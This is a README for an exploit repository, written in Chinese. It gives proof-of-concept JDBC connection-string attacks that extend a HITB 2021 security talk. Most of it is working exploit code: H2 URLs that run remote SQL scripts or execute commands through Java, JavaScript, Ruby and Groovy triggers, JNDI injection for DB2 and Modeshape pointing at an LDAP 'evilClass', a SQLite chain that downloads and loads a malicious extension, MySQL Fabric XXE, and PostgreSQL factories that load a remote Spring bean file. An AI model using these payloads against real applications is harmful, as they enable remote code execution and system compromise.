# atkjdbc

HITB SECCONF Singapore-2021 议题 [Make JDBC Attacks Brilliant Again](https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf) 的利用代码。
对议题内容进行了一些拓展，补充了利用方式和 Poc 代码。

## Content

仓库包含以下数据库 JDBC Driver 的 Poc 代码。

### Spring Boot H2 Console

出网

```java
jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8001/poc.sql'
```

不出网，通过多语句执行，

```java
jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"trganda\"\\;}'\\;CALL EXEC ('open -a Calculator.app')
```

#### SourceCompiler

或通过脚本语言引擎，支持 Javascript、Ruby、Groovy。

Javascript，

```java
@Test
public void js() throws SQLException {
    String javascript =
            "//javascript\njava.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")";

    // only work on old h2 version
    // String oldUrl =
    //            "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;MODE=MSSQLServer;INIT=CREATE
    // TRIGGER POC BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS '"
    //                + javascript
    //                + "'";

    String url =
            "jdbc:h2:mem:db;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE SCHEMA IF NOT EXISTS db\\;CREATE TABLE db.TEST(ID INT PRIMARY KEY, NAME VARCHAR(255))\\;CREATE TRIGGER POC BEFORE SELECT ON db.TEST AS '"
                    + javascript
                    + "'";

    Connection conn = DriverManager.getConnection(url);
    conn.close();
}
```

JRuby，

```java
@Test
public void ruby() throws SQLException {
    String ruby =
            "#ruby\nrequire \"java\"\njava.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")";
    String url =
            "jdbc:h2:mem:db;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE SCHEMA IF NOT EXISTS db\\;CREATE TABLE db.TEST(ID INT PRIMARY KEY, NAME VARCHAR(255))\\;CREATE TRIGGER POC BEFORE SELECT ON db.TEST AS '"
                    + ruby
                    + "'";

    Connection conn = DriverManager.getConnection(url);
    conn.close();
}
```

Groovy

```java
@Test
public void groovyAsset() throws SQLException {
    String groovy =
            "@groovy.transform.ASTTest(value={"
                    + " assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")"
                    + "})"
                    + "def x";
    String url =
            "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS T5 AS '"
                    + groovy
                    + "'";

    Connection conn = DriverManager.getConnection(url);
    conn.close();
}
```

### Apache Derby

Master 模式下，借助反序列化，slave 会返回恶意数据。

```java
@Test
public void derby() throws SQLException {
    DriverManager.getConnection("jdbc:derby:db;startMaster=true;slaveHost=127.0.0.1");
}
```

### IBM H2

JNDI 注入

```java
@Test
public void db2() throws SQLException {
    String url =
            "jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:1389/evilClass;";
    DriverManager.getConnection(url);
}
```

### Java Content Repository

JCR 的实现 Modeshape 可以使用 JNDI。


```java
@Test
public void modeshape() throws SQLException {
    String url = "jdbc:jcr:jndi:ldap://127.0.0.1:1389/evilClass";
    DriverManager.getConnection(url);
}
```

### SQLite

议题原分享者，只是假设有一个可控的 SQLite Extension 文件的话可以利用。
但实际上仅通过 SQLite Driver 就足够达到这一点了，因为它内部的 SSRF 本事就是一个文件上传的功能，只不过有大小限制。

目前只在 Ubuntu 测试过，编译 `poc.c` 文件，

```sh
gcc -Os -flto -fdata-sections -ffunction-sections -c poc.c
```

通过 `poc.lds` 链接脚本，编译 Extension（保证体积不超过 8K），

```sh
gcc -T poc.lds -fPIC -s -nostartfiles -nostdlib -flto -shared poc.o -o pocs.so
```

执行 Poc 代码

```java
public static void createDb(String path) {
	File dbFile = new File("src/main/resources/poc.db");
	if (dbFile.exists()) {
		dbFile.delete();
	}

	try (Connection conn =
			 DriverManager.getConnection(
				 String.format("jdbc:sqlite:%s", "src/main/resources/poc.db"));) {
		conn.setAutoCommit(true);
		Statement statement = conn.createStatement();
		statement.execute(String.format("CREATE VIEW POC AS SELECT load_extension('%s', 'poc');", path));
		statement.close();
	} catch (SQLException e) {
		// ttk...
	}
}

@Test
public void sqlite() throws SQLException, MalformedURLException {

	String extensionUrl = "http://127.0.0.1:8001/poc.so";

	URL resourceAddr = new URL(extensionUrl);
	String extensionPath = String.format("/tmp/sqlite-jdbc-tmp-%d.db", resourceAddr.hashCode());
	System.out.println(extensionPath);

	createDb(extensionPath);

	System.out.println(System.getProperty("java.io.tmpdir"));

	// upload extension file
	Connection conn =
			DriverManager.getConnection(
					String.format("jdbc:sqlite::resource:%s", extensionUrl));
	conn.close();

	// poc
	String url =
			"jdbc:sqlite::resource:http://127.0.0.1:8001/poc.db?enable_load_extension=true";
	Connection connection = DriverManager.getConnection(url);
	connection.setAutoCommit(true);

	Statement statement = connection.createStatement();
	statement.execute("SELECT * FROM POC");

	statement.close();
	connection.close();
}
```

另一种攻击方式是利用 magellan 漏洞，超出知识范围，暂未实现。

### MySQL Fabric

利用 XMLRPC，实现 XML 外部实体注入。

```java
@Test
public void fabric() throws SQLException {
	String url = "jdbc:mysql:fabric://127.0.0.1:5000";
	Connection conn = DriverManager.getConnection(url);
}
```

### Postgresql

利用自定义类加载和构造方法

- `org.springframework.context.support.ClassPathXmlApplicationContext`
- `org.springframework.context.support.FileSystemXmlApplicationContext`
- `java.io.FileOutputStream`

```java
@Test
public void socketFactory() throws SQLException {
	String url = "jdbc:postgresql://localhost/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=ftp://127.0.0.1:2121/bean.xml";
	DriverManager.getConnection(url);
}

@Test
public void sslFactory() throws SQLException {
	String url = "jdbc:postgresql://localhost/test?sslfactory=org.springframework.context.support.ClassPathXmlApplicationContext&sslfactoryarg=ftp://127.0.0.1:2121/bean.xml";
	DriverManager.getConnection(url);
}
```
